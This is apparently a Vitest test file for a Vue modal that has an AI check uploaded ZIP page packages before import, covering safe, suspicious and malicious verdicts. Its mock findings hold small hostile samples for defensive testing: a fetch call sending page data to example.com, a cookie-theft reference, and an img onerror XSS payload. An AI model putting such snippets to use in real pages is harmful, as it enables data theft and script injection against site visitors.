import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { defineComponent, h } from 'vue'
import { enableAutoUnmount, flushPromises, mount } from '@vue/test-utils'
import ImportPageModal from '../ImportPageModal.vue'
import CreatePagePanel from '../CreatePagePanel.vue'
import { pageKeys, queryClient } from '../../../lib/query-client'

const FormKitStub = defineComponent({
  name: 'FormKit',
  props: {
    modelValue: { type: String, default: '' },
    disabled: Boolean,
  },
  emits: ['update:modelValue'],
  setup(props, { emit }) {
    return () =>
      h(
        'select',
        {
          'data-test': 'model-selector',
          value: props.modelValue,
          disabled: props.disabled,
          onChange: (event: Event) =>
            emit('update:modelValue', (event.target as HTMLSelectElement).value),
        },
        [h('option', { value: '' }, '默认模型'), h('option', { value: 'model-a' }, 'Model A')],
      )
  },
})

const mocks = vi.hoisted(() => ({
  importPage:
    vi.fn<(request: { body: File; reviewId: string; confirmed?: boolean }) => Promise<unknown>>(),
  reviewPageImport:
    vi.fn<
      (
        request: { body: File; model?: string },
        options?: { signal?: AbortSignal; timeout?: number },
      ) => Promise<unknown>
    >(),
  push: vi.fn<(location: unknown) => unknown>(),
  status: vi.fn<() => Promise<unknown>>(),
  toastError: vi.fn<(message: string) => void>(),
  toastInfo: vi.fn<(message: string) => void>(),
}))
vi.mock('../../../api/clients', () => ({
  aiPageBuilderApi: {
    importPage: mocks.importPage,
    reviewPageImport: mocks.reviewPageImport,
  },
  aiPageBuilderAiApi: { getAiPageBuilderAiStatus: mocks.status },
}))
vi.mock('vue-router', () => ({ useRouter: () => ({ push: mocks.push }) }))
vi.mock('@halo-dev/components', async (importOriginal) => {
  const original = await importOriginal<typeof import('@halo-dev/components')>()
  const { defineComponent, h } = await import('vue')
  return {
    ...original,
    Toast: { error: mocks.toastError, info: mocks.toastInfo },
    VButton: defineComponent({
      props: ['disabled', 'loading'],
      setup:
        (props, { slots }) =>
        () =>
          h('button', { type: 'button', disabled: props.disabled }, slots.default?.()),
    }),
  }
})

enableAutoUnmount(afterEach)
afterEach(() => vi.useRealTimers())
beforeEach(() => {
  vi.restoreAllMocks()
  vi.resetAllMocks()
  queryClient.clear()
  mocks.reviewPageImport.mockResolvedValue({ data: report('safe') })
  mocks.importPage.mockResolvedValue({ data: { page: { name: 'imported-page' } } })
  mocks.status.mockResolvedValue({ data: { available: true, message: '' } })
})

function report(
  verdict: 'safe' | 'suspicious' | 'malicious',
  findings: Array<Record<string, string>> = [],
) {
  return {
    reviewId: 'review-1',
    verdict,
    summary: verdict === 'safe' ? 'AI 未发现明显风险。' : 'AI 发现需要关注的内容。',
    findings,
    title: '页面',
    description: '',
    themeLayout: false,
    expiresAt: '2026-10-18T10:00:00Z',
  }
}

// The modal mounts to the body, so keep its teleported content inside the
// wrapper for the DOM queries below.
const modalOptions = {
  global: { stubs: { teleport: true }, components: { FormKit: FormKitStub } },
}

function modal() {
  return mount(ImportPageModal, modalOptions)
}
function button(wrapper: ReturnType<typeof mount>, text: string) {
  return wrapper.findAll('button').find((node) => node.text() === text)!
}
async function select(wrapper: ReturnType<typeof modal>, file: File) {
  const input = wrapper.get<HTMLInputElement>('input[type=file]')
  Object.defineProperty(input.element, 'files', { value: [file], configurable: true })
  await input.trigger('change')
}
async function startReview(wrapper: ReturnType<typeof modal>) {
  await button(wrapper, '开始 AI 审查').trigger('click')
  await flushPromises()
}
async function reviewed(wrapper: ReturnType<typeof modal>, file: File) {
  await select(wrapper, file)
  await startReview(wrapper)
}

describe('page archive import', () => {
  it('opens the import modal next to manual creation and cancels it', async () => {
    vi.useFakeTimers()
    const wrapper = mount(CreatePagePanel, {
      global: {
        stubs: { ChatComposer: true, ManualCreateModal: true, teleport: true },
        components: { FormKit: FormKitStub },
      },
    })
    await flushPromises()
    const manual = button(wrapper, '手动创建页面')
    const entry = button(wrapper, '导入页面')
    expect(entry.classes()).toEqual(manual.classes())
    expect(entry.element.parentElement).toBe(manual.element.parentElement)
    await entry.trigger('click')
    expect(wrapper.findComponent(ImportPageModal).exists()).toBe(true)
    await button(wrapper, '取消').trigger('click')
    await vi.advanceTimersByTimeAsync(250)
    expect(wrapper.findComponent(ImportPageModal).exists()).toBe(false)
  })

  it('reviews the selected file before importing a safe report', async () => {
    const invalidate = vi.spyOn(queryClient, 'invalidateQueries')
    const wrapper = modal()
    expect(wrapper.text()).toContain('导入前会先由 AI 审查页面包')
    const file = new File(['zip'], 'page.ZIP', { type: 'application/octet-stream' })
    await reviewed(wrapper, file)

    expect(mocks.reviewPageImport).toHaveBeenCalledTimes(1)
    expect(mocks.reviewPageImport.mock.calls[0]![0].body).toBe(file)
    expect(mocks.reviewPageImport.mock.calls[0]![0].model).toBeUndefined()
    expect(mocks.importPage).not.toHaveBeenCalled()
    expect(wrapper.text()).toContain('AI 审查通过')
    expect(wrapper.text()).toContain('AI 未发现明显风险。')

    await button(wrapper, '导入页面').trigger('click')
    await flushPromises()

    expect(mocks.importPage).toHaveBeenCalledTimes(1)
    expect(mocks.importPage.mock.calls[0]![0]).toMatchObject({
      body: file,
      reviewId: 'review-1',
    })
    expect(mocks.importPage.mock.calls[0]![0].confirmed).toBeUndefined()
    expect(invalidate).toHaveBeenCalledWith({ queryKey: pageKeys.all })
    expect(mocks.push).toHaveBeenCalledWith({
      name: 'AiPageBuilderEditor',
      params: { name: 'imported-page' },
    })
  })

  it('sends the selected AI model with the review request', async () => {
    const wrapper = modal()
    await select(wrapper, new File(['zip'], 'page.zip'))
    await wrapper.get('[data-test=model-selector]').setValue('model-a')
    await startReview(wrapper)

    expect(mocks.reviewPageImport.mock.calls[0]![0]).toMatchObject({
      body: expect.any(File),
      model: 'model-a',
    })
  })

  it('shows the AI Foundation status and disables review when unavailable', () => {
    const wrapper = mount(ImportPageModal, {
      ...modalOptions,
      props: { aiAvailable: false, aiStatusMessage: 'AI Foundation 未启用' },
    })

    expect(wrapper.find('[data-test=model-selector]').exists()).toBe(false)
    expect(wrapper.text()).toContain('AI Foundation 未启用')
    expect(button(wrapper, 'AI 审查不可用').attributes('disabled')).toBeDefined()
  })

  it('shows findings and requires confirmation for a suspicious report', async () => {
    mocks.reviewPageImport.mockResolvedValue({
      data: report('suspicious', [
        {
          severity: 'high',
          category: 'data_exfiltration',
          file: 'script.js',
          evidence: "fetch('https://example.com/collect')",
          explanation: '脚本会把页面数据发送到外部地址。',
        },
      ]),
    })
    const wrapper = modal()
    const file = new File(['zip'], 'page.zip')
    await reviewed(wrapper, file)

    expect(wrapper.text()).toContain('AI 审查发现风险')
    expect(wrapper.text()).toContain('高')
    expect(wrapper.text()).toContain('数据外传')
    expect(wrapper.text()).toContain('script.js')
    expect(wrapper.get('pre').text()).toBe("fetch('https://example.com/collect')")
    expect(wrapper.text()).toContain('脚本会把页面数据发送到外部地址。')
    expect(button(wrapper, '仍然导入').attributes('disabled')).toBeDefined()

    await wrapper.get('input[type=checkbox]').setValue(true)
    expect(button(wrapper, '仍然导入').attributes('disabled')).toBeUndefined()

    await button(wrapper, '仍然导入').trigger('click')
    await flushPromises()
    expect(mocks.importPage).toHaveBeenCalledTimes(1)
    expect(mocks.importPage.mock.calls[0]![0]).toMatchObject({
      body: file,
      reviewId: 'review-1',
      confirmed: true,
    })
  })

  it('blocks a malicious report and does not offer re-review', async () => {
    mocks.reviewPageImport.mockResolvedValue({
      data: report('malicious', [
        {
          severity: 'critical',
          category: 'data_exfiltration',
          file: 'script.js',
          evidence: 'document.cookie',
          explanation: '脚本会窃取访客 Cookie。',
        },
      ]),
    })
    const wrapper = modal()
    await reviewed(wrapper, new File(['zip'], 'page.zip'))

    expect(wrapper.text()).toContain('AI 审查判定为恶意页面，禁止导入')
    expect(wrapper.text()).toContain('该页面包 30 分钟内不能重新审查或导入')
    const blocked = button(wrapper, '发现恶意内容，无法导入')
    expect(blocked.attributes('disabled')).toBeDefined()
    await blocked.trigger('click')
    await flushPromises()
    expect(mocks.importPage).not.toHaveBeenCalled()
    expect(wrapper.findAll('button').some((node) => node.text() === '重新审查')).toBe(false)
    expect(wrapper.get('[data-test=model-selector]').attributes('disabled')).toBeDefined()
  })

  it('reports review failures with a toast, keeps the file and allows retry', async () => {
    mocks.reviewPageImport.mockRejectedValueOnce({
      response: { data: { detail: 'AI 审查不可用，请检查 AI Foundation。' } },
    })
    const wrapper = modal()
    const file = new File(['zip'], 'page.zip')
    await reviewed(wrapper, file)

    expect(mocks.toastError).toHaveBeenCalledWith('AI 审查不可用，请检查 AI Foundation。')
    expect(mocks.importPage).not.toHaveBeenCalled()
    expect(button(wrapper, '开始 AI 审查').attributes('disabled')).toBeUndefined()

    await startReview(wrapper)
    expect(mocks.reviewPageImport).toHaveBeenCalledTimes(2)
    expect(wrapper.text()).toContain('AI 审查通过')
  })

  it('does not submit without a file', async () => {
    const wrapper = modal()
    await startReview(wrapper)
    expect(mocks.reviewPageImport).not.toHaveBeenCalled()
    expect(mocks.toastError).toHaveBeenCalledWith('请选择 ZIP 文件。')
  })

  it.each(['page.txt', 'page.zip.txt', 'page'])('rejects the invalid filename %s', async (name) => {
    const wrapper = modal()
    await select(wrapper, new File(['zip'], name, { type: 'application/zip' }))
    await startReview(wrapper)
    expect(mocks.reviewPageImport).not.toHaveBeenCalled()
    expect(mocks.toastError).toHaveBeenCalledWith('请选择 .zip 格式的文件。')
  })

  it('rejects files over 4 MiB and accepts the exact size limit after correcting the file', async () => {
    const wrapper = modal()
    await select(wrapper, new File([new Uint8Array(4 * 1024 * 1024 + 1)], 'large.zip'))
    await startReview(wrapper)
    expect(mocks.reviewPageImport).not.toHaveBeenCalled()
    expect(mocks.toastError).toHaveBeenCalledWith('ZIP 文件大小不能超过 4 MiB。')
    mocks.toastError.mockClear()
    await select(wrapper, new File([new Uint8Array(4 * 1024 * 1024)], 'page.zip'))
    expect(mocks.toastError).not.toHaveBeenCalled()
    await startReview(wrapper)
    expect(mocks.reviewPageImport).toHaveBeenCalledTimes(1)
  })

  it('resets the report when a different file is selected', async () => {
    const wrapper = modal()
    await reviewed(wrapper, new File(['zip'], 'page.zip'))
    expect(wrapper.text()).toContain('AI 审查通过')
    await select(wrapper, new File(['zip'], 'other.zip'))
    expect(wrapper.text()).not.toContain('AI 审查通过')
    expect(button(wrapper, '开始 AI 审查').exists()).toBe(true)
  })

  it('renders evidence as text and never as HTML', async () => {
    mocks.reviewPageImport.mockResolvedValue({
      data: report('suspicious', [
        {
          severity: 'medium',
          category: 'prompt_injection',
          file: 'page.html',
          evidence: '<img src=x onerror="alert(1)">',
          explanation: '内容试图注入 HTML。',
        },
      ]),
    })
    const wrapper = modal()
    await reviewed(wrapper, new File(['zip'], 'page.zip'))
    expect(wrapper.find('img').exists()).toBe(false)
    expect(wrapper.get('pre').text()).toBe('<img src=x onerror="alert(1)">')
  })

  it('blocks rapid review resubmission and all close paths while pending', async () => {
    vi.useFakeTimers()
    let resolve!: (value: unknown) => void
    mocks.reviewPageImport.mockReturnValue(new Promise((done) => (resolve = done)))
    const wrapper = modal()
    await select(wrapper, new File(['zip'], 'page.zip'))
    const reviewButton = button(wrapper, '开始 AI 审查')
    const firstClick = reviewButton.trigger('click')
    const secondClick = reviewButton.trigger('click')
    await Promise.all([firstClick, secondClick])
    await flushPromises()
    expect(mocks.reviewPageImport).toHaveBeenCalledTimes(1)
    expect(wrapper.get('input').attributes('disabled')).toBeDefined()
    expect(reviewButton.attributes('disabled')).toBeDefined()
    expect(button(wrapper, '取消').attributes('disabled')).toBeDefined()
    const headerClose = wrapper.get('.modal-header-actions > span')
    await button(wrapper, '取消').trigger('click')
    await headerClose.trigger('click')
    await wrapper.get('.modal-layer').trigger('click')
    await wrapper.get('input').trigger('keyup', { key: 'Escape' })
    await wrapper.get('[role=dialog]').trigger('keyup', { key: 'Escape' })
    await vi.advanceTimersByTimeAsync(250)
    expect(wrapper.emitted('close')).toBeUndefined()
    expect(wrapper.get<HTMLElement>('.modal-content').element.style.display).not.toBe('none')
    resolve({ data: report('safe') })
    await flushPromises()
    await vi.advanceTimersByTimeAsync(0)
    expect(button(wrapper, '取消').attributes('disabled')).toBeUndefined()
    await headerClose.trigger('click')
    await vi.advanceTimersByTimeAsync(250)
    expect(wrapper.emitted('close')).toHaveLength(1)
  })

  it('cancels a pending review and unlocks the modal', async () => {
    vi.useFakeTimers()
    let options: { signal?: AbortSignal; timeout?: number } | undefined
    mocks.reviewPageImport.mockImplementation((_request, requestOptions) => {
      options = requestOptions
      return new Promise(() => {})
    })
    const wrapper = modal()
    await select(wrapper, new File(['zip'], 'page.zip'))
    await button(wrapper, '开始 AI 审查').trigger('click')
    await flushPromises()

    expect(options?.signal?.aborted).toBe(false)
    expect(options?.timeout).toBe(11 * 60 * 1000)

    await button(wrapper, '取消审查').trigger('click')
    await flushPromises()

    expect(options?.signal?.aborted).toBe(true)
    expect(mocks.toastInfo).toHaveBeenCalledWith('已取消审查。')
    expect(button(wrapper, '取消').attributes('disabled')).toBeUndefined()
    await button(wrapper, '取消').trigger('click')
    await vi.advanceTimersByTimeAsync(250)
    expect(wrapper.emitted('close')).toHaveLength(1)
  })

  it('blocks rapid import resubmission while pending', async () => {
    let resolve!: (value: unknown) => void
    mocks.importPage.mockReturnValue(new Promise((done) => (resolve = done)))
    const wrapper = modal()
    await reviewed(wrapper, new File(['zip'], 'page.zip'))
    vi.useFakeTimers()
    const importButton = button(wrapper, '导入页面')
    const firstClick = importButton.trigger('click')
    const secondClick = importButton.trigger('click')
    await Promise.all([firstClick, secondClick])
    await flushPromises()
    expect(mocks.importPage).toHaveBeenCalledTimes(1)
    expect(importButton.attributes('disabled')).toBeDefined()
    expect(button(wrapper, '取消').attributes('disabled')).toBeDefined()
    resolve({ data: { page: { name: 'imported-page' } } })
    await flushPromises()
    expect(mocks.push).toHaveBeenCalledTimes(1)
  })

  it('allows Escape to close the idle modal', async () => {
    vi.useFakeTimers()
    const wrapper = modal()
    await wrapper.get('[role=dialog]').trigger('keyup', { key: 'Escape' })
    await vi.advanceTimersByTimeAsync(250)
    expect(wrapper.emitted('close')).toHaveLength(1)
  })
})
